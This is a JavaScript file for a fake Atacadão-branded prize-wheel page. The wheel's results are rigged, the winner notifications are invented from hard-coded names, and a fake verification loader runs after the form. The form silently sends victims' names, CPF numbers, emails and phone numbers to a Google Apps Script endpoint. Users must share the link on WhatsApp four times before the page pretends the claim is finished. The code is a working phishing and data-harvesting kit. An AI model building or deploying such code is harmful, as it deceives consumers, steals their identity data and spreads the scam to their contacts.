/**
 * Atacadão Mobile Sweepstakes JavaScript - Multi-Screen Flow
 * Handles Canvas rendering, synthesized mechanical tick sounds, haptic feedback,
 * SPA screen transitions, 12-second progress loader with logging console, 
 * WhatsApp sharing simulation, and Facebook comments integration.
 */

document.addEventListener('DOMContentLoaded', () => {
    // --- SPLASH SCREEN ---
    const splashScreen = document.getElementById('splashScreen');
    const appContainer = document.getElementById('appContainer');

    // Hide splash after 2 seconds, then reveal app
    setTimeout(() => {
        splashScreen.classList.add('hidden');
        appContainer.style.display = 'flex';
        // Small delay for the fade transition, then start notifications
        setTimeout(() => {
            splashScreen.style.display = 'none';
            startWinnerNotifications();
        }, 500);
    }, 2000);

    // Screen Elements
    const screenWheel = document.getElementById('screen-wheel');
    const screenForm = document.getElementById('screen-form');
    const screenLoading = document.getElementById('screen-loading');
    const screenShare = document.getElementById('screen-share');
    const fbCommentsBlock = document.getElementById('fbCommentsBlock');

    // Canvas & Game Elements
    const canvas = document.getElementById('rouletteWheel');
    const ctx = canvas.getContext('2d');
    const spinBtn = document.getElementById('spinBtn');
    const rouletteContainer = document.querySelector('.roulette-container');
    const trackerCount = document.getElementById('trackerCount');

    // Form Inputs
    const claimForm = document.getElementById('claimForm');
    const claimName = document.getElementById('claimName');
    const claimCpf = document.getElementById('claimCpf');
    const claimEmail = document.getElementById('claimEmail');
    const claimPhone = document.getElementById('claimPhone');

    // Sharing Screen Elements
    const shareProgressFill = document.getElementById('shareProgressFill');
    const shareProgressText = document.getElementById('shareProgressText');
    const finalizeBtn = document.getElementById('finalizeBtn');

    // Modals
    const failModal = document.getElementById('failModal');
    const failTitle = document.getElementById('failTitle');
    const failMsg = document.getElementById('failMsg');
    const failBtn = document.getElementById('failBtn');
    
    const winModal = document.getElementById('winModal');
    const goToFormBtn = document.getElementById('goToFormBtn');
    const successModal = document.getElementById('successModal');
    const successBtn = document.getElementById('successBtn');
    const confettiContainer = document.getElementById('confettiContainer');

    // Web Audio Context
    let audioCtx = null;

    // Roulette parameters
    const labels = [
        "Vale R$ 200", 
        "Tente Novamente", 
        "Vale R$ 520", 
        "Tente Novamente", 
        "Vale R$ 250"
    ];
    const baseColors = ["#1a9859", "#0056b3", "#ffd700", "#003d80", "#f1660b"];
    const darkColors = ["#0f5e36", "#003670", "#b8960f", "#002247", "#b34a00"];
    const numSlices = labels.length;
    const sliceAngle = (2 * Math.PI) / numSlices;
    
    let attemptsLeft = 3;
    let currentAngle = 0;
    let isSpinning = false;
    let lastWedgeIndex = -1;
    let secondAttemptLost = false;
    let currentPrize = '';
    
    const winIndices = [0, 4];
    const rareIndex = 2;
    
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = Math.min(centerX, centerY) - 24;

    // Sharing tracker

    // --- SYNTHESIZE AUDIO TICK SOUND ---
    function playTickSound() {
        try {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }
            
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            
            osc.type = 'sine';
            osc.frequency.setValueAtTime(600, audioCtx.currentTime); 
            osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.04);
            
            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.04);
            
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            
            osc.start();
            osc.stop(audioCtx.currentTime + 0.04);
            
            if (navigator.vibrate) {
                navigator.vibrate(8);
            }
        } catch (e) {
            console.log("Audio playback blocked/unsupported:", e);
        }
    }

    // --- RENDER WHEEL ---
    function drawWheel(angleOffset = 0) {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        ctx.save();
        ctx.translate(centerX, centerY);
        ctx.rotate(angleOffset);
        
        for (let i = 0; i < numSlices; i++) {
            const startAngle = i * sliceAngle;
            const endAngle = (i + 1) * sliceAngle;
            
            ctx.beginPath();
            ctx.moveTo(0, 0);
            ctx.arc(0, 0, radius, startAngle, endAngle);
            ctx.closePath();
            
            const grad = ctx.createRadialGradient(0, 0, 10, 0, 0, radius);
            grad.addColorStop(0, '#ffffff');
            grad.addColorStop(0.15, baseColors[i]);
            grad.addColorStop(1, darkColors[i]);
            
            ctx.fillStyle = grad;
            ctx.fill();
            
            ctx.strokeStyle = 'rgba(255, 255, 255, 0.4)';
            ctx.lineWidth = 2.5;
            ctx.stroke();
            
            ctx.save();
            ctx.rotate(startAngle + sliceAngle / 2);
            ctx.textAlign = 'right';
            ctx.textBaseline = 'middle';
            
            ctx.fillStyle = (baseColors[i] === '#ffc107') ? '#1e2229' : '#ffffff';
            ctx.font = 'bold 15px "Ubuntu", sans-serif';
            
            ctx.shadowColor = (baseColors[i] === '#ffc107') ? 'rgba(255,255,255,0.3)' : 'rgba(0, 0, 0, 0.4)';
            ctx.shadowBlur = 4;
            ctx.shadowOffsetX = 1;
            ctx.shadowOffsetY = 1;
            
            ctx.fillText(labels[i], radius - 20, 0);
            ctx.restore();
        }
        
        ctx.beginPath();
        ctx.arc(0, 0, radius + 2, 0, 2 * Math.PI);
        ctx.strokeStyle = '#ffffff';
        ctx.lineWidth = 2;
        ctx.stroke();
        
        ctx.beginPath();
        ctx.arc(0, 0, radius + 9, 0, 2 * Math.PI);
        ctx.strokeStyle = '#dca000';
        ctx.lineWidth = 14;
        ctx.stroke();
        
        const numBulbs = 18;
        const blinkPhase = Math.floor(Date.now() / 200) % 2;
        
        for (let j = 0; j < numBulbs; j++) {
            const bulbAngle = (j * 2 * Math.PI) / numBulbs;
            const bx = Math.cos(bulbAngle) * (radius + 9);
            const by = Math.sin(bulbAngle) * (radius + 9);
            
            ctx.beginPath();
            ctx.arc(bx, by, 3.5, 0, 2 * Math.PI);
            
            if ((j + blinkPhase) % 2 === 0) {
                ctx.fillStyle = '#fffa65';
                ctx.shadowColor = '#fff200';
                ctx.shadowBlur = 8;
            } else {
                ctx.fillStyle = '#ffffff';
                ctx.shadowColor = '#ffffff';
                ctx.shadowBlur = 4;
            }
            ctx.fill();
            ctx.shadowBlur = 0;
            
            ctx.strokeStyle = '#7f5f00';
            ctx.lineWidth = 0.5;
            ctx.stroke();
        }
        
        ctx.beginPath();
        ctx.arc(0, 0, 38, 0, 2 * Math.PI);
        
        const centerGrad = ctx.createLinearGradient(-30, -30, 30, 30);
        centerGrad.addColorStop(0, '#ffffff');
        centerGrad.addColorStop(0.5, '#e2e8f0');
        centerGrad.addColorStop(1, '#94a3b8');
        
        ctx.fillStyle = centerGrad;
        ctx.shadowColor = 'rgba(0, 0, 0, 0.3)';
        ctx.shadowBlur = 10;
        ctx.shadowOffsetY = 4;
        ctx.fill();
        
        ctx.shadowBlur = 0;
        ctx.strokeStyle = 'var(--brand-orange)';
        ctx.lineWidth = 4;
        ctx.stroke();
        
        ctx.restore();
    }
    
    // Animate lights on idle
    function idleAnimation() {
        if (!isSpinning) {
            drawWheel(currentAngle);
        }
        requestAnimationFrame(idleAnimation);
    }
    requestAnimationFrame(idleAnimation);

    // --- SPINNING LOGIC ---
    function pickWinIndex() {
        if (Math.random() < 0.05) return rareIndex;
        return winIndices[Math.floor(Math.random() * winIndices.length)];
    }

    function spinWheel() {
        if (isSpinning || attemptsLeft <= 0) return;
        
        isSpinning = true;
        spinBtn.classList.add('disabled');
        
        attemptsLeft--;
        updateAttemptsUI();
        
        let targetIndex;
        if (attemptsLeft === 2) {
            targetIndex = 1;
        } else if (attemptsLeft === 1) {
            const won = Math.random() < 0.5;
            targetIndex = won ? pickWinIndex() : 3;
            secondAttemptLost = !won;
        } else {
            targetIndex = secondAttemptLost ? pickWinIndex() : (Math.random() < 0.5 ? pickWinIndex() : 1);
        }
        
        currentPrize = labels[targetIndex];
        
        const targetSliceCenter = (targetIndex + 0.5) * sliceAngle;
        const targetAngleOffset = (1.5 * Math.PI) - targetSliceCenter;
        
        const baseSpins = 6; 
        const randomWedgeOffset = (Math.random() - 0.5) * sliceAngle * 0.45;
        
        const finalRotation = (baseSpins * 2 * Math.PI) + targetAngleOffset + randomWedgeOffset;
        const startRotation = currentAngle % (2 * Math.PI);
        const distance = finalRotation - startRotation;
        
        const duration = 4800;
        let startTime = null;
        
        function easeOutCubic(t) {
            return 1 - Math.pow(1 - t, 3);
        }
        
        function animate(timestamp) {
            if (!startTime) startTime = timestamp;
            const elapsed = timestamp - startTime;
            const progress = Math.min(elapsed / duration, 1);
            
            currentAngle = startRotation + distance * easeOutCubic(progress);
            drawWheel(currentAngle);
            
            const relativeAngle = (1.5 * Math.PI - currentAngle) % (2 * Math.PI);
            const normalizedAngle = (relativeAngle + 2 * Math.PI) % (2 * Math.PI);
            const wedgeIndex = Math.floor(normalizedAngle / sliceAngle);
            
            if (wedgeIndex !== lastWedgeIndex) {
                playTickSound();
                lastWedgeIndex = wedgeIndex;
                
                rouletteContainer.style.transform = `scale(1.02) rotate(${((Math.random() - 0.5) * 1.5)}deg)`;
                setTimeout(() => {
                    rouletteContainer.style.transform = 'scale(1) rotate(0deg)';
                }, 40);
            }
            
            if (progress < 1) {
                requestAnimationFrame(animate);
            } else {
                isSpinning = false;
                
                rouletteContainer.style.transform = 'scale(0.97)';
                setTimeout(() => {
                    rouletteContainer.style.transform = 'scale(1)';
                    handleSpinResult(targetIndex);
                }, 150);
            }
        }
        
        requestAnimationFrame(animate);
    }
    
    spinBtn.addEventListener('click', spinWheel);
    
    function updateAttemptsUI() {
        if (attemptsLeft === 2) {
            trackerCount.innerText = "2 restantes";
        } else if (attemptsLeft === 1) {
            trackerCount.innerText = "1 restante";
        } else if (attemptsLeft === 0) {
            trackerCount.innerText = "0 restantes";
        }
    }
    
    function handleSpinResult(sliceIndex) {
        if (sliceIndex === 1 || sliceIndex === 3) {
            setTimeout(() => {
                if (attemptsLeft === 2) {
                    failTitle.innerText = "Quase lá!";
                    failMsg.innerHTML = "A roleta passou raspando pelo prêmio!<br>Você ainda tem <strong>2 tentativas</strong> restantes.";
                } else if (attemptsLeft === 1) {
                    failTitle.innerText = "Não desanime!";
                    failMsg.innerHTML = "Por muito pouco você não ganhou!<br>Sua última tentativa tem <strong>CHANCE DUPLA</strong>!";
                } else {
                    failTitle.innerText = "Não foi dessa vez!";
                    failMsg.innerHTML = "Suas tentativas acabaram. Volte amanhã para mais chances!";
                }
                toggleModal(failModal, true);
            }, 400);
        } else if (sliceIndex === 0 || sliceIndex === 2 || sliceIndex === 4) {
            setTimeout(() => {
                const winTitle = document.querySelector('#winModal .modal-title');
                const winMsg = document.querySelector('#winModal .modal-message');
                if (currentPrize === labels[2]) {
                    winMsg.innerHTML = `<strong>PARABÉNS!</strong> Você ganhou o <strong>GRANDE PRÊMIO</strong> de <strong>${currentPrize}</strong> no Atacadão!`;
                } else {
                    winMsg.innerHTML = `Parabéns! Você ganhou um <strong>${currentPrize}</strong> no Atacadão!`;
                }
                toggleModal(winModal, true);
                triggerConfetti();
                // No more spins
                spinBtn.classList.add('disabled');
            }, 400);
        }
    }
    
    // Helper to lock body scroll when modal is open
    function toggleModal(modal, show) {
        if (show) {
            modal.classList.add('active');
            document.body.classList.add('modal-open');
        } else {
            modal.classList.remove('active');
            document.body.classList.remove('modal-open');
        }
    }

    failBtn.addEventListener('click', () => {
        toggleModal(failModal, false);
        if (attemptsLeft > 0) {
            spinBtn.classList.remove('disabled');
        }
    });

    // WIN TRANSITION -> Switch to Screen 2
    goToFormBtn.addEventListener('click', () => {
        toggleModal(winModal, false);
        switchScreen(screenForm);
    });

    // SPA View Switcher
    function switchScreen(newScreen) {
        const screens = [screenWheel, screenForm, screenLoading, screenShare];
        screens.forEach(s => s.classList.remove('active'));
        
        newScreen.classList.add('active');
        
        // Hide Facebook comments on the Loading screen, keep it on others
        if (newScreen === screenLoading) {
            fbCommentsBlock.style.display = 'none';
        } else {
            fbCommentsBlock.style.display = 'block';
        }

        // Scroll to top of app container
        window.scrollTo(0, 0);
    }

    // --- FORM MASK VALIDATORS (Screen 2) ---
    claimCpf.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        
        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2})$/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{1,3})$/, '$1.$2');
        }
        e.target.value = value;
    });
    
    claimPhone.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        
        if (value.length > 10) {
            value = value.replace(/^(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{2})(\d{4})(\d{0,4})$/, '($1) $2-$3');
        } else if (value.length > 2) {
            value = value.replace(/^(\d{2})(\d{0,4})$/, '($1) $2');
        } else if (value.length > 0) {
            value = `(${value}`;
        }
        e.target.value = value;
    });

    // --- SCREEN 3: LOADING COM CHECK VERDE ---
    function startVerification() {
        const spinner = document.getElementById('loadingSpinner');
        const check = document.getElementById('loadingCheck');
        const title = document.getElementById('loadingTitle');
        const steps = document.querySelectorAll('.loading-step');

        spinner.classList.remove('hidden');
        check.classList.add('hidden');
        title.textContent = 'Aguarde...';

        steps.forEach((s, i) => {
            s.classList.remove('active', 'done');
            s.querySelector('.step-check').textContent = '◻';
        });

        const totalSteps = steps.length;
        const durationPerStep = 3500;
        let currentStep = 0;

        // Activate first step
        if (steps[0]) steps[0].classList.add('active');

        const interval = setInterval(() => {
            // Mark current step as done
            if (steps[currentStep]) {
                steps[currentStep].classList.remove('active');
                steps[currentStep].classList.add('done');
                steps[currentStep].querySelector('.step-check').textContent = '✓';
            }

            currentStep++;

            if (currentStep < totalSteps) {
                // Activate next step
                steps[currentStep].classList.add('active');
            } else {
                // All steps done - show green check
                clearInterval(interval);
                spinner.style.display = 'none';
                check.classList.remove('hidden');
                title.textContent = 'Pronto! Vale-Compra vinculado com sucesso!';

                setTimeout(() => {
                    switchScreen(screenShare);
                    // Reset for next time
                    spinner.style.display = 'flex';
                }, 1800);
            }
        }, durationPerStep);
    }

    // --- SCREEN 4: WHATSAPP SHARING ---
    const shareMessage = "Acabei de participar da campanha do Atacadão e ganhei um vale-compra! Corre lá para ganhar o seu também: " + window.location.origin + window.location.pathname;
    const shareWhatsAppBtn = document.getElementById('shareWhatsAppBtn');
    const shareCountBadge = document.getElementById('shareCountBadge');
    const shareStatusBadge = document.getElementById('shareStatusBadge');
    const chkShareCount = document.getElementById('chk-share-count');
    const chkShareStatus = document.getElementById('chk-share-status');

    let shareClickCount = 0;
    let statusShared = false;

    shareWhatsAppBtn.addEventListener('click', () => {
        window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(shareMessage)}`, '_blank');

        if (!statusShared && shareClickCount >= 3) {
            statusShared = true;
            chkShareStatus.classList.add('done');
            shareStatusBadge.textContent = '✓';
        } else if (shareClickCount < 3) {
            shareClickCount++;
            shareCountBadge.textContent = `${shareClickCount}/3`;
            if (shareClickCount === 3) {
                chkShareCount.classList.add('done');
            }
        }

        updateShareProgress();
    });

    function updateShareProgress() {
        const total = shareClickCount + (statusShared ? 1 : 0);
        const needed = 4;
        const pct = (total / needed) * 100;
        shareProgressFill.style.width = `${pct}%`;
        shareProgressText.innerText = `Progresso: ${total}/${needed}`;

        if (total >= needed) {
            finalizeBtn.classList.remove('disabled');
            finalizeBtn.disabled = false;
            finalizeBtn.style.animation = 'buttonPulse 1.5s infinite';
        }
    }

    // Finalize claim -> Open success modal
    finalizeBtn.addEventListener('click', () => {
        toggleModal(successModal, true);
        triggerConfetti();
    });

    // Reset everything and go back to Screen 1
    successBtn.addEventListener('click', () => {
        toggleModal(successModal, false);
        
        // Reset state
        attemptsLeft = 3;
        currentAngle = 0;
        isSpinning = false;
        secondAttemptLost = false;
        currentPrize = '';
        shareClickCount = 0;
        statusShared = false;

        // Reset elements Screen 1
        trackerCount.innerText = "3 restantes";
        spinBtn.classList.remove('disabled');
        drawWheel(0);

        // Reset elements Screen 2
        claimName.value = '';
        claimCpf.value = '';
        claimEmail.value = '';
        claimPhone.value = '';

        // Reset elements Screen 4
        shareProgressFill.style.width = "0%";
        shareProgressText.innerText = "Progresso: 0/4";
        finalizeBtn.classList.add('disabled');
        finalizeBtn.disabled = true;
        finalizeBtn.style.animation = 'none';
        shareCountBadge.textContent = '0/3';
        shareStatusBadge.textContent = '✗';
        chkShareCount.classList.remove('done');
        chkShareStatus.classList.remove('done');

        // Go back to screen 1
        switchScreen(screenWheel);
    });

    // --- CONFETTI GENERATOR ---
    function triggerConfetti() {
        confettiContainer.innerHTML = '';
        const confettiColors = ['#f1660b', '#1a9859', '#ffd700', '#0056b3', '#dc3545'];
        const confettiCount = 90;
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            
            const left = Math.random() * 100;
            const sizeWidth = Math.random() * 5 + 6;
            const sizeHeight = Math.random() * 10 + 5;
            const color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
            const delay = Math.random() * 1.8;
            const duration = Math.random() * 1.2 + 1.6;
            
            confetti.style.left = `${left}%`;
            confetti.style.width = `${sizeWidth}px`;
            confetti.style.height = `${sizeHeight}px`;
            confetti.style.backgroundColor = color;
            confetti.style.animationDelay = `${delay}s`;
            confetti.style.animationDuration = `${duration}s`;
            confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
            
            confettiContainer.appendChild(confetti);
        }
    }

    // --- WINNER NOTIFICATIONS (Social Proof Toasts) ---
    const winnerNames = [
        { name: "Maria Silva", city: "São Paulo, SP" },
        { name: "João Santos", city: "Rio de Janeiro, RJ" },
        { name: "Ana Oliveira", city: "Belo Horizonte, MG" },
        { name: "Carlos Lima", city: "Salvador, BA" },
        { name: "Fernanda Costa", city: "Brasília, DF" },
        { name: "Pedro Almeida", city: "Fortaleza, CE" },
        { name: "Juliana Martins", city: "Curitiba, PR" },
        { name: "Lucas Pereira", city: "Recife, PE" },
        { name: "Amanda Souza", city: "Porto Alegre, RS" },
        { name: "Rafael Oliveira", city: "Campinas, SP" },
        { name: "Beatriz Rocha", city: "Manaus, AM" },
        { name: "Thiago Barbosa", city: "Goiânia, GO" },
        { name: "Camila Fernandes", city: "Santos, SP" },
        { name: "Gabriel Dias", city: "Niterói, RJ" },
        { name: "Larissa Ribeiro", city: "Uberlândia, MG" }
    ];
    const prizes = ["R$ 520", "R$ 100", "R$ 50", "R$ 250", "R$ 100", "R$ 520", "R$ 50", "R$ 250", "R$ 50", "R$ 100"];
    const avatarColors = ["#f1660b", "#1a9859", "#0056b3", "#dc3545", "#6f42c1", "#e83e8c"];

    let winnerInterval = null;

    function showWinnerToast() {
        const toastContainer = document.getElementById('winnerToast');
        if (!toastContainer) return;

        const winner = winnerNames[Math.floor(Math.random() * winnerNames.length)];
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        const letter = winner.name.charAt(0);
        const color = avatarColors[Math.floor(Math.random() * avatarColors.length)];
        const timeAgo = ['há 1 min', 'há 2 min', 'há 3 min', 'há 5 min', 'há 8 min', 'há 12 min'][Math.floor(Math.random() * 6)];

        const toast = document.createElement('div');
        toast.className = 'winner-toast';
        toast.innerHTML = `
            <div class="winner-toast-avatar" style="background-color: ${color}">${letter}</div>
            <div class="winner-toast-info">
                <div class="winner-toast-name">${winner.name}</div>
                <div class="winner-toast-prize">${winner.city} — Ganhou <strong>${prize}</strong></div>
            </div>
            <span class="winner-toast-time">${timeAgo}</span>
        `;

        toastContainer.appendChild(toast);

        setTimeout(() => {
            toast.classList.add('removing');
            setTimeout(() => toast.remove(), 300);
        }, 5000);
    }

    function startWinnerNotifications() {
        if (winnerInterval) clearInterval(winnerInterval);
        // Show first one after 5 seconds
        setTimeout(showWinnerToast, 5000);
        // Then every 15 seconds
        function scheduleNext() {
            winnerInterval = setTimeout(() => {
                showWinnerToast();
                scheduleNext();
            }, 15000);
        }
        scheduleNext();
    }

    // Stop notifications when certain modals are active
    function stopWinnerNotifications() {
        if (winnerInterval) {
            clearInterval(winnerInterval);
            winnerInterval = null;
        }
    }

    // Pause during modals
    const allModals = [failModal, winModal, successModal];
    allModals.forEach(modal => {
        const observer = new MutationObserver(() => {
            if (modal.classList.contains('active')) {
                stopWinnerNotifications();
            } else {
                startWinnerNotifications();
            }
        });
        observer.observe(modal, { attributes: true, attributeFilter: ['class'] });
    });

    // --- FORM SUBMISSION TO GOOGLE SHEETS ---
    const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbyLRQFrA1BiXU5IzmcTiye4KxJGsdtyeCpQ1_ME59qg81UEn4brk-d2j61mBW5x6HeP/exec';

    claimForm.addEventListener('submit', (e) => {
        e.preventDefault();

        const cpfRaw = claimCpf.value.replace(/\D/g, '').trim();
        const phoneRaw = claimPhone.value.replace(/\D/g, '');

        if (cpfRaw.length !== 11 || /^(\d)\1{10}$/.test(cpfRaw)) {
            alert('Por favor, insira um CPF válido com 11 dígitos.');
            return;
        }
        if (phoneRaw.length < 10) {
            alert('Por favor, insira um telefone válido com o código de área (DDD).');
            return;
        }

        const submitBtn = document.getElementById('submitFormBtn');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Enviando...';

        // Create a hidden form and submit to iframe (bypasses CORS issues)
        const iframe = document.getElementById('hidden_iframe');
        const hiddenForm = document.createElement('form');
        hiddenForm.method = 'POST';
        hiddenForm.action = GOOGLE_SHEETS_URL;
        hiddenForm.target = 'hidden_iframe';
        hiddenForm.style.display = 'none';

        const fields = {
            nome: claimName.value.trim(),
            cpf: claimCpf.value.trim(),
            email: claimEmail.value.trim(),
            telefone: claimPhone.value.trim(),
            premio: currentPrize || "Vale-Compra",
            data: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
        };

        for (const [key, value] of Object.entries(fields)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = value;
            hiddenForm.appendChild(input);
        }

        document.body.appendChild(hiddenForm);

        // Listen for iframe load (submission completed)
        iframe.onload = () => {
            document.body.removeChild(hiddenForm);
            switchScreen(screenLoading);
            startVerification();
        };

        hiddenForm.submit();

        // Fallback: if iframe doesn't fire, proceed anyway after 3s
        setTimeout(() => {
            if (document.body.contains(hiddenForm)) {
                document.body.removeChild(hiddenForm);
                switchScreen(screenLoading);
                startVerification();
            }
        }, 3000);
    });

    // --- SHOW MORE COMMENTS TOGGLE ---
    const fbShowMore = document.getElementById('fbShowMore');
    const fbHiddenComments = document.getElementById('fbHiddenComments');
    if (fbShowMore && fbHiddenComments) {
        fbShowMore.addEventListener('click', () => {
            const isOpen = fbHiddenComments.classList.toggle('open');
            fbShowMore.textContent = isOpen ? 'Mostrar menos' : 'Ver mais comentários (34)';
        });
    }
});
